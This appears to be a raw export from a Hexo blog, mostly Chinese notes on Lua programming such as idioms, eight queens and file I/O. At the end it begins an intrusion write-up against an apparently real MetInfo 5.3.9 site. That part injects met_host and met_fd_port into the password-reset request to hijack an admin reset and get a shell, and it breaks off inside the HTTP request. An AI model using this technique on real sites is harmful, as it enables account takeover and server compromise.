href=\"#惯用写法-x-x-or-v\" class=\"headerlink\" title=\"惯用写法 x=x or v\"></a>惯用写法 x=x or v</h3><figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">--等价于</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"keyword\">not</span> x <span class=\"keyword\">then</span> x = v <span class=\"keyword\">end</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"type-nil-nil-疑惑\"><a href=\"#type-nil-nil-疑惑\" class=\"headerlink\" title=\"type(nil) == nil 疑惑\"></a>type(nil) == nil 疑惑</h3><p>返回是string类型，用nil做比较应用”nil”</p>\n<figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; <span class=\"built_in\">type</span>(<span class=\"literal\">nil</span>) == <span class=\"literal\">nil</span> </span><br><span class=\"line\"><span class=\"literal\">false</span></span><br><span class=\"line\">&gt; <span class=\"built_in\">type</span>(<span class=\"literal\">nil</span>) == <span class=\"string\">\"nil\"</span> </span><br><span class=\"line\"><span class=\"literal\">true</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"编写打印自身名称的程序\"><a href=\"#编写打印自身名称的程序\" class=\"headerlink\" title=\"编写打印自身名称的程序\"></a>编写打印自身名称的程序</h3><figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">arg</span>[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"comment\">--考点在编译器运行代码前会先创建arg表来存储命令行参数。</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"八皇后\"><a href=\"#八皇后\" class=\"headerlink\" title=\"八皇后\"></a>八皇后</h2><h3 id=\"输出1解\"><a href=\"#输出1解\" class=\"headerlink\" title=\"输出1解\"></a>输出1解</h3><p>addqueen中添加os.exit()</p>\n<figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">--eight-queen.lua</span></span><br><span class=\"line\">N = <span class=\"number\">8</span> <span class=\"comment\">--棋盘大小</span></span><br><span class=\"line\">a = &#123;<span class=\"number\">3</span>,<span class=\"number\">7</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">8</span>,<span class=\"number\">6</span>,<span class=\"number\">5</span>,<span class=\"number\">4</span>&#125;</span><br><span class=\"line\"><span class=\"comment\">-- 打印棋盘</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">printsolution</span><span class=\"params\">(a)</span></span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i=<span class=\"number\">1</span>,N <span class=\"keyword\">do</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> j=<span class=\"number\">1</span>,N <span class=\"keyword\">do</span></span><br><span class=\"line\">\t\t\t<span class=\"built_in\">io</span>.<span class=\"built_in\">write</span>(a[i]==j <span class=\"keyword\">and</span> <span class=\"string\">\"X\"</span> <span class=\"keyword\">or</span> <span class=\"string\">\"-\"</span>,<span class=\"string\">\" \"</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">end</span></span><br><span class=\"line\">\t\t<span class=\"built_in\">io</span>.<span class=\"built_in\">write</span>(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">end</span></span><br><span class=\"line\"><span class=\"keyword\">end</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">-- 检查当前皇后是否会被攻击，c为列数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">isplaceok</span><span class=\"params\">(a,n,c)</span></span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i=<span class=\"number\">1</span>,n<span class=\"number\">-1</span> <span class=\"keyword\">do</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (a[i]==c) <span class=\"keyword\">or</span> <span class=\"comment\">--同一列</span></span><br><span class=\"line\">\t\t   (a[i]-i == c-n) <span class=\"keyword\">or</span>\t<span class=\"comment\">--右下对角线</span></span><br><span class=\"line\">\t\t   (a[i]+i==c+n) <span class=\"keyword\">then</span>   <span class=\"comment\">--左下对角线</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span> <span class=\"comment\">--遭受攻击</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">end</span></span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t<span class=\"keyword\">end</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span> <span class=\"comment\">--不会被攻击</span></span><br><span class=\"line\"><span class=\"keyword\">end</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">--添加皇后</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">addqueen</span><span class=\"params\">(a,n)</span></span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> n &gt; N <span class=\"keyword\">then</span></span><br><span class=\"line\">\t\tprintsolution(a)</span><br><span class=\"line\">\t\t<span class=\"built_in\">os</span>.<span class=\"built_in\">exit</span>()</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> c=<span class=\"number\">1</span>,N <span class=\"keyword\">do</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> isplaceok(a,n,c) <span class=\"keyword\">then</span></span><br><span class=\"line\">\t\t\t\ta[n] = c</span><br><span class=\"line\">\t\t\t\taddqueen(a,n+<span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">end</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">end</span></span><br><span class=\"line\">\t<span class=\"keyword\">end</span></span><br><span class=\"line\"><span class=\"keyword\">end</span></span><br><span class=\"line\">addqueen(&#123;&#125;,<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"强制返回一个结果\"><a href=\"#强制返回一个结果\" class=\"headerlink\" title=\"强制返回一个结果\"></a>强制返回一个结果</h2><figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">--使用括号强制返回第一个返回值</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo2</span><span class=\"params\">()</span></span> <span class=\"keyword\">return</span> <span class=\"string\">\"a\"</span>, <span class=\"string\">\"b\"</span> <span class=\"keyword\">end</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/lua/001.png\" alt=\"001\"></p>\n<h2 id=\"table-unpack\"><a href=\"#table-unpack\" class=\"headerlink\" title=\"table.unpack\"></a>table.unpack</h2><figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">--将列表转化成一组返回值</span></span><br><span class=\"line\"><span class=\"built_in\">table</span>.<span class=\"built_in\">unpack</span>(&#123;<span class=\"string\">\"Sun\"</span>,<span class=\"string\">\"Mon\"</span>,<span class=\"string\">\"Tue\"</span>,<span class=\"string\">\"Wed\"</span>&#125;,<span class=\"number\">2</span>,<span class=\"number\">3</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">--结果</span></span><br><span class=\"line\">Mon\tTue</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"文件操作\"><a href=\"#文件操作\" class=\"headerlink\" title=\"文件操作\"></a>文件操作</h2><h3 id=\"简单I-O模型\"><a href=\"#简单I-O模型\" class=\"headerlink\" title=\"简单I/O模型\"></a>简单I/O模型</h3><figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">io</span>.<span class=\"built_in\">read</span>(<span class=\"string\">\"a\"</span>) <span class=\"comment\">--读取整个文件</span></span><br><span class=\"line\"><span class=\"built_in\">io</span>.<span class=\"built_in\">read</span>(<span class=\"string\">\"l\"</span>) <span class=\"comment\">--读取下一行（丢弃换行符）</span></span><br><span class=\"line\"><span class=\"built_in\">io</span>.<span class=\"built_in\">read</span>(<span class=\"string\">\"L\"</span>) <span class=\"comment\">--读取下一行（保留换行符）</span></span><br><span class=\"line\"><span class=\"built_in\">io</span>.<span class=\"built_in\">read</span>(<span class=\"string\">\"n\"</span>) <span class=\"comment\">--读取一个数值</span></span><br><span class=\"line\"><span class=\"built_in\">io</span>.<span class=\"built_in\">read</span>(num) <span class=\"comment\">--以字符串读取num个字符</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">-- 只读打开指定文件，并将文件设置为当前输入流</span></span><br><span class=\"line\"><span class=\"built_in\">io</span>.<span class=\"built_in\">input</span>([file])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">-- 设置默认输出文件</span></span><br><span class=\"line\"><span class=\"built_in\">io</span>.<span class=\"built_in\">output</span>([file])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">-- 不带参数关闭默认文件</span></span><br><span class=\"line\"><span class=\"built_in\">io</span>.<span class=\"built_in\">close</span>([file])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">-- 不带参数使用默认文件，返回一个迭代器，用在for循环</span></span><br><span class=\"line\"><span class=\"built_in\">io</span>.<span class=\"built_in\">lines</span>([file])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">-- 将字符串或数字写入输出流</span></span><br><span class=\"line\"><span class=\"built_in\">io</span>.<span class=\"built_in\">write</span>(value)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">-- 将换缓冲数据写入文件</span></span><br><span class=\"line\"><span class=\"built_in\">io</span>.<span class=\"built_in\">flush</span>()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"完整I-O模型\"><a href=\"#完整I-O模型\" class=\"headerlink\" title=\"完整I/O模型\"></a>完整I/O模型</h3><figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">-- 检查错误方法</span></span><br><span class=\"line\"><span class=\"keyword\">local</span> f = <span class=\"built_in\">assert</span>(<span class=\"built_in\">io</span>.<span class=\"built_in\">open</span>(filename,mode))</span><br></pre></td></tr></table></figure>\n\n<p>seek获取设置文件位置</p>\n<figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">f:seek(whence,offset)</span><br><span class=\"line\"><span class=\"comment\">-- 返回当前位置1相对于文件开头的偏移</span></span><br><span class=\"line\"><span class=\"comment\">-- whence指定使用偏移的字符串  \t\t</span></span><br><span class=\"line\"><span class=\"comment\">-- set文件头 cur当前位置 end文件尾部 </span></span><br><span class=\"line\"><span class=\"comment\">-- offset 偏移量</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"运行系统命令\"><a href=\"#运行系统命令\" class=\"headerlink\" title=\"运行系统命令\"></a>运行系统命令</h3><figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">os</span>.<span class=\"built_in\">execute</span> 和 <span class=\"built_in\">io</span>.<span class=\"built_in\">popen</span></span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Lua程序设计第4版-笔记\"><a href=\"#Lua程序设计第4版-笔记\" class=\"headerlink\" title=\"Lua程序设计第4版-笔记\"></a>Lua程序设计第4版-笔记</h1><h2 id=\"Lua语言入门\"><a href=\"#Lua语言入门\" class=\"headerlink\" title=\"Lua语言入门\"></a>Lua语言入门</h2><h3 id=\"三目运算\"><a href=\"#三目运算\" class=\"headerlink\" title=\"三目运算\"></a>三目运算</h3><figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">((a <span class=\"keyword\">and</span> b)<span class=\"keyword\">or</span> c)或(a <span class=\"keyword\">and</span> b <span class=\"keyword\">or</span> c)</span><br><span class=\"line\"><span class=\"comment\">--b不等于false时,等价于C语言的a?b:c</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"惯用写法-x-x-or-v\"><a href=\"#惯用写法-x-x-or-v\" class=\"headerlink\" title=\"惯用写法 x=x or v\"></a>惯用写法 x=x or v</h3><figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">--等价于</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"keyword\">not</span> x <span class=\"keyword\">then</span> x = v <span class=\"keyword\">end</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"type-nil-nil-疑惑\"><a href=\"#type-nil-nil-疑惑\" class=\"headerlink\" title=\"type(nil) == nil 疑惑\"></a>type(nil) == nil 疑惑</h3><p>返回是string类型，用nil做比较应用”nil”</p>\n<figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; <span class=\"built_in\">type</span>(<span class=\"literal\">nil</span>) == <span class=\"literal\">nil</span> </span><br><span class=\"line\"><span class=\"literal\">false</span></span><br><span class=\"line\">&gt; <span class=\"built_in\">type</span>(<span class=\"literal\">nil</span>) == <span class=\"string\">\"nil\"</span> </span><br><span class=\"line\"><span class=\"literal\">true</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"编写打印自身名称的程序\"><a href=\"#编写打印自身名称的程序\" class=\"headerlink\" title=\"编写打印自身名称的程序\"></a>编写打印自身名称的程序</h3><figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">arg</span>[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"comment\">--考点在编译器运行代码前会先创建arg表来存储命令行参数。</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"八皇后\"><a href=\"#八皇后\" class=\"headerlink\" title=\"八皇后\"></a>八皇后</h2><h3 id=\"输出1解\"><a href=\"#输出1解\" class=\"headerlink\" title=\"输出1解\"></a>输出1解</h3><p>addqueen中添加os.exit()</p>\n<figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">--eight-queen.lua</span></span><br><span class=\"line\">N = <span class=\"number\">8</span> <span class=\"comment\">--棋盘大小</span></span><br><span class=\"line\">a = &#123;<span class=\"number\">3</span>,<span class=\"number\">7</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">8</span>,<span class=\"number\">6</span>,<span class=\"number\">5</span>,<span class=\"number\">4</span>&#125;</span><br><span class=\"line\"><span class=\"comment\">-- 打印棋盘</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">printsolution</span><span class=\"params\">(a)</span></span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i=<span class=\"number\">1</span>,N <span class=\"keyword\">do</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> j=<span class=\"number\">1</span>,N <span class=\"keyword\">do</span></span><br><span class=\"line\">\t\t\t<span class=\"built_in\">io</span>.<span class=\"built_in\">write</span>(a[i]==j <span class=\"keyword\">and</span> <span class=\"string\">\"X\"</span> <span class=\"keyword\">or</span> <span class=\"string\">\"-\"</span>,<span class=\"string\">\" \"</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">end</span></span><br><span class=\"line\">\t\t<span class=\"built_in\">io</span>.<span class=\"built_in\">write</span>(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">end</span></span><br><span class=\"line\"><span class=\"keyword\">end</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">-- 检查当前皇后是否会被攻击，c为列数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">isplaceok</span><span class=\"params\">(a,n,c)</span></span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i=<span class=\"number\">1</span>,n<span class=\"number\">-1</span> <span class=\"keyword\">do</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (a[i]==c) <span class=\"keyword\">or</span> <span class=\"comment\">--同一列</span></span><br><span class=\"line\">\t\t   (a[i]-i == c-n) <span class=\"keyword\">or</span>\t<span class=\"comment\">--右下对角线</span></span><br><span class=\"line\">\t\t   (a[i]+i==c+n) <span class=\"keyword\">then</span>   <span class=\"comment\">--左下对角线</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span> <span class=\"comment\">--遭受攻击</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">end</span></span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t<span class=\"keyword\">end</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span> <span class=\"comment\">--不会被攻击</span></span><br><span class=\"line\"><span class=\"keyword\">end</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">--添加皇后</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">addqueen</span><span class=\"params\">(a,n)</span></span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> n &gt; N <span class=\"keyword\">then</span></span><br><span class=\"line\">\t\tprintsolution(a)</span><br><span class=\"line\">\t\t<span class=\"built_in\">os</span>.<span class=\"built_in\">exit</span>()</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> c=<span class=\"number\">1</span>,N <span class=\"keyword\">do</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> isplaceok(a,n,c) <span class=\"keyword\">then</span></span><br><span class=\"line\">\t\t\t\ta[n] = c</span><br><span class=\"line\">\t\t\t\taddqueen(a,n+<span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">end</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">end</span></span><br><span class=\"line\">\t<span class=\"keyword\">end</span></span><br><span class=\"line\"><span class=\"keyword\">end</span></span><br><span class=\"line\">addqueen(&#123;&#125;,<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"强制返回一个结果\"><a href=\"#强制返回一个结果\" class=\"headerlink\" title=\"强制返回一个结果\"></a>强制返回一个结果</h2><figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">--使用括号强制返回第一个返回值</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo2</span><span class=\"params\">()</span></span> <span class=\"keyword\">return</span> <span class=\"string\">\"a\"</span>, <span class=\"string\">\"b\"</span> <span class=\"keyword\">end</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/lua/001.png\" alt=\"001\"></p>\n<h2 id=\"table-unpack\"><a href=\"#table-unpack\" class=\"headerlink\" title=\"table.unpack\"></a>table.unpack</h2><figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">--将列表转化成一组返回值</span></span><br><span class=\"line\"><span class=\"built_in\">table</span>.<span class=\"built_in\">unpack</span>(&#123;<span class=\"string\">\"Sun\"</span>,<span class=\"string\">\"Mon\"</span>,<span class=\"string\">\"Tue\"</span>,<span class=\"string\">\"Wed\"</span>&#125;,<span class=\"number\">2</span>,<span class=\"number\">3</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">--结果</span></span><br><span class=\"line\">Mon\tTue</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"文件操作\"><a href=\"#文件操作\" class=\"headerlink\" title=\"文件操作\"></a>文件操作</h2><h3 id=\"简单I-O模型\"><a href=\"#简单I-O模型\" class=\"headerlink\" title=\"简单I/O模型\"></a>简单I/O模型</h3><figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">io</span>.<span class=\"built_in\">read</span>(<span class=\"string\">\"a\"</span>) <span class=\"comment\">--读取整个文件</span></span><br><span class=\"line\"><span class=\"built_in\">io</span>.<span class=\"built_in\">read</span>(<span class=\"string\">\"l\"</span>) <span class=\"comment\">--读取下一行（丢弃换行符）</span></span><br><span class=\"line\"><span class=\"built_in\">io</span>.<span class=\"built_in\">read</span>(<span class=\"string\">\"L\"</span>) <span class=\"comment\">--读取下一行（保留换行符）</span></span><br><span class=\"line\"><span class=\"built_in\">io</span>.<span class=\"built_in\">read</span>(<span class=\"string\">\"n\"</span>) <span class=\"comment\">--读取一个数值</span></span><br><span class=\"line\"><span class=\"built_in\">io</span>.<span class=\"built_in\">read</span>(num) <span class=\"comment\">--以字符串读取num个字符</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">-- 只读打开指定文件，并将文件设置为当前输入流</span></span><br><span class=\"line\"><span class=\"built_in\">io</span>.<span class=\"built_in\">input</span>([file])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">-- 设置默认输出文件</span></span><br><span class=\"line\"><span class=\"built_in\">io</span>.<span class=\"built_in\">output</span>([file])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">-- 不带参数关闭默认文件</span></span><br><span class=\"line\"><span class=\"built_in\">io</span>.<span class=\"built_in\">close</span>([file])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">-- 不带参数使用默认文件，返回一个迭代器，用在for循环</span></span><br><span class=\"line\"><span class=\"built_in\">io</span>.<span class=\"built_in\">lines</span>([file])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">-- 将字符串或数字写入输出流</span></span><br><span class=\"line\"><span class=\"built_in\">io</span>.<span class=\"built_in\">write</span>(value)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">-- 将换缓冲数据写入文件</span></span><br><span class=\"line\"><span class=\"built_in\">io</span>.<span class=\"built_in\">flush</span>()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"完整I-O模型\"><a href=\"#完整I-O模型\" class=\"headerlink\" title=\"完整I/O模型\"></a>完整I/O模型</h3><figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">-- 检查错误方法</span></span><br><span class=\"line\"><span class=\"keyword\">local</span> f = <span class=\"built_in\">assert</span>(<span class=\"built_in\">io</span>.<span class=\"built_in\">open</span>(filename,mode))</span><br></pre></td></tr></table></figure>\n\n<p>seek获取设置文件位置</p>\n<figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">f:seek(whence,offset)</span><br><span class=\"line\"><span class=\"comment\">-- 返回当前位置1相对于文件开头的偏移</span></span><br><span class=\"line\"><span class=\"comment\">-- whence指定使用偏移的字符串  \t\t</span></span><br><span class=\"line\"><span class=\"comment\">-- set文件头 cur当前位置 end文件尾部 </span></span><br><span class=\"line\"><span class=\"comment\">-- offset 偏移量</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"运行系统命令\"><a href=\"#运行系统命令\" class=\"headerlink\" title=\"运行系统命令\"></a>运行系统命令</h3><figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">os</span>.<span class=\"built_in\">execute</span> 和 <span class=\"built_in\">io</span>.<span class=\"built_in\">popen</span></span><br></pre></td></tr></table></figure>\n\n"},{"title":"MetInfos实战","date":"2019-04-10T15:11:52.000Z","_content":"\n发现目标是**MetInfo 5.3.9** ，结合任意账户密码重置登录后台Getshell。\n\n![001](/img/cms/MetInfo/Getshell/1.png)\n\n在忘记密码处抓包，添加met_fd_port和met_host,met_host是服务器ip地址。先别忙发送。\n\n![002](/img/cms/MetInfo/Getshell/2.png)\n\n数据包如下。\n\n```\nPOST /admin/admin/getpassword.php HTTP/1.1\nHost: ***.***.***.***\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:60.0) Gecko/20100101 Firefox/60.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nReferer: http://***.***.***.***/admin/admin/getpassword.php\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 123\nConnection: 